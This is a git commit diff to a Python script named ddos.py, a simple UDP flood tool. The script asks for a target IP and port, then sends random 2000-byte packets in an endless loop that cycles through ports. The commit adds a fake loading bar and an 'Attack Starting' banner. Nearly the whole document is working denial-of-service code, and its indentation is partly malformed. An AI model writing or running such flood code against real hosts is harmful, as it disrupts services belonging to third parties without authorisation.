62dd6162f2e4f5eb31dcb24fb9a25570c0b4a72a
jaja13090 <69601407+jaja13090@users.noreply.github.com>
2020-08-19 02:08:59 +0200

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -11,14 +11,26 @@ bytes = random._urandom(2000)
 ip = raw_input("IP ADDRESS: ")
 port = input("PORT : ")
 
-os.system("clear")
-sent = 0
 
 while True:
-     connect.sendto(bytes, (ip,port))
+     
+os.system("clear")
+os.system("figlet Attack Starting")
+print "[                    ] 0% "
+time.sleep(5)
+print "[=====               ] 25%"
+time.sleep(5)
+print "[==========          ] 50%"
+time.sleep(5)
+print "[===============     ] 75%"
+time.sleep(5)
+print "[====================] 100%"
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "\033[0;31mConnected --> \033[0;32m%s"%(ip)
-     time.sleep(2)
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
